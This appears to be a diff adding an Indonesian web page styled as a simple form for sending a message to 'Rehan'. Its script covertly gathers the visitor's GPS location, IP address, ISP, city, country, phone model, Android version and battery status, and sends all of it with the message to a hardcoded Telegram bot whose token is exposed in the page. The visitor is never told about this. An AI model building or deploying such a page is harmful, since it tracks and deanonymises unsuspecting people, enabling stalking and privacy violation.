@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kirim Pesan ke Rehan</title>
+<style>
+body {
+    margin:0;
+    padding:0;
+    background:linear-gradient(to bottom,#2176b5,#0e1f3d);
+    font-family:Arial,sans-serif;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+.box {
+    backdrop-filter:blur(10px);
+    background:rgba(255,255,255,0.15);
+    border-radius:12px;
+    padding:25px;
+    width:95%;
+    max-width:380px;
+    color:white;
+    text-align:center;
+    box-sizing:border-box;
+}
+textarea {
+    width:100%;
+    padding:10px;
+    border-radius:8px;
+    border:none;
+    font-size:16px;
+    margin-top:10px;
+    outline:none;
+    box-sizing:border-box;
+}
+button {
+    margin-top:15px;
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:8px;
+    font-size:17px;
+    font-weight:bold;
+    background:#1e62d0;
+    cursor:pointer;
+    color:white;
+}
+button:active {transform:scale(0.97);}
+.toast {
+    position:absolute;
+    top:-50px;
+    left:50%;
+    transform:translateX(-50%);
+    padding:10px 20px;
+    background:linear-gradient(90deg,#6a0dad,#4b0082);
+    color:white;
+    border-radius:8px;
+    opacity:0;
+    pointer-events:none;
+    transition:opacity 0.3s, top 0.3s;
+    z-index:100;
+    font-weight:bold;
+    text-align:center;
+}
+.toast.show {
+    top:10px;
+    opacity:1;
+}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>Kirim Pesan ke Rehan</h2>
+<textarea id="pesan" rows="4" placeholder="Tulis pesan di sini..."></textarea>
+<button id="btnKirim">KIRIM PESAN</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const BOT_TOKEN = "8460626408:AAH1-67wDVP06frJylVhwLBj2F6Ep7lUtvU";
+const CHAT_ID = "7508766509";
+
+// Toast
+function showToast(msg){
+    const toast=document.getElementById("toast");
+    toast.textContent=msg;
+    toast.classList.add("show");
+    setTimeout(()=>toast.classList.remove("show"),2500);
+}
+
+// GPS
+function getGPS(){
+    return new Promise(resolve=>{
+        if(!navigator.geolocation){resolve("Tidak tersedia");return;}
+        navigator.geolocation.getCurrentPosition(
+            pos=>resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
+            ()=>resolve("User menolak izin GPS")
+        );
+    });
+}
+
+// IP Info dengan fallback
+async function getIPInfo(){
+    try{
+        // coba ip-api.com
+        let res = await fetch("https://ip-api.com/json/?fields=status,message,country,city,isp,query");
+        let data = await res.json();
+        if(data.status==="success") return {ip:data.query,country:data.country,city:data.city,isp:data.isp};
+
+        // fallback ipwho.is
+        res = await fetch("https://ipwho.is/");
+        data = await res.json();
+        if(data.success) return {ip:data.ip,country:data.country,city:data.city,isp:data.connection.isp};
+
+        return {ip:"Tidak tersedia",country:"-",city:"-",isp:"-"};
+    }catch(e){return {ip:"Tidak tersedia",country:"-",city:"-",isp:"-"};}
+}
+
+// Device Info
+async function getDeviceInfo(){
+    const ua=navigator.userAgent;
+    let merkHP="Unknown";
+    let versiAndroid="Unknown";
+    let battery="Tidak tersedia";
+
+    if(navigator.getBattery){
+        try{
+            const b=await navigator.getBattery();
+            battery=`${(b.level*100).toFixed(0)}%, ${b.charging?"Charging":"Tidak charging"}`;
+        }catch(e){}
+    }
+
+    try{
+        const match=ua.match(/\(([^)]+)\)/);
+        if(match){
+            const parts=match[1].split(";").map(s=>s.trim());
+            for(let part of parts){
+                if(/Build/.test(part)) merkHP=part.replace("Build","").trim();
+                if(/Android/i.test(part)) versiAndroid=part.trim();
+            }
+        }
+    }catch(e){}
+
+    return {merkHP, androidVer: versiAndroid, battery};
+}
+
+// Format
+function formatDeviceInfo(info){
+    return `• Merk HP: ${info.merkHP}\n• Android: ${info.androidVer}\n• Battery: ${info.battery}`;
+}
+function formatIPInfo(info){
+    return `• IP: ${info.ip}\n• ISP: ${info.isp}\n• City: ${info.city}\n• Country: ${info.country}`;
+}
+
+// Kirim Telegram
+async function kirimKeTelegram(pesan,gps,deviceInfo,ipInfo){
+    const waktu=new Date().toLocaleString("id-ID",{timeZone:"Asia/Jakarta"});
+    const msg=`📩 *Pesan Baru Untuk Rehan*
+━━━━━━━━━━━━━━━━
+💬 Pesan: ${pesan}
+📍 Lokasi: ${gps}
+━━━━━━━━━━━━━━━━
+📱 Device Info:
+\`\`\`
+${formatDeviceInfo(deviceInfo)}
+\`\`\`
+🌐 IP Info:
+\`\`\`
+${formatIPInfo(ipInfo)}
+\`\`\`
+⏰ Waktu: ${waktu}
+━━━━━━━━━━━━━━━━
+`;
+
+    const url=`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        const send=await fetch(url,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})
+        });
+
+        const result = await send.json();
+        console.log(result);
+        return send.ok;
+    } catch(e){
+        console.error("Error:", e);
+        return false;
+    }
+}
+
+// Tombol Kirim
+document.getElementById("btnKirim").addEventListener("click",async ()=>{
+    const pesan=document.getElementById("pesan").value.trim();
+    if(!pesan){showToast("⚠ Isi pesannya dulu."); return;}
+
+    showToast("⏳ Mengumpulkan info...");
+    const gps=await getGPS();
+    const ipInfo=await getIPInfo();
+    const deviceInfo=await getDeviceInfo();
+
+    showToast("📤 Mengirim pesan...");
+    const success=await kirimKeTelegram(pesan,gps,deviceInfo,ipInfo);
+    
+    if(success){
+        showToast("✅ Pesan berhasil dikirim!");
+        document.getElementById("pesan").value="";
+    } else {
+        showToast("❌ Gagal mengirim pesan!");
+    }
+});
+</script>
+</body>
+</html>
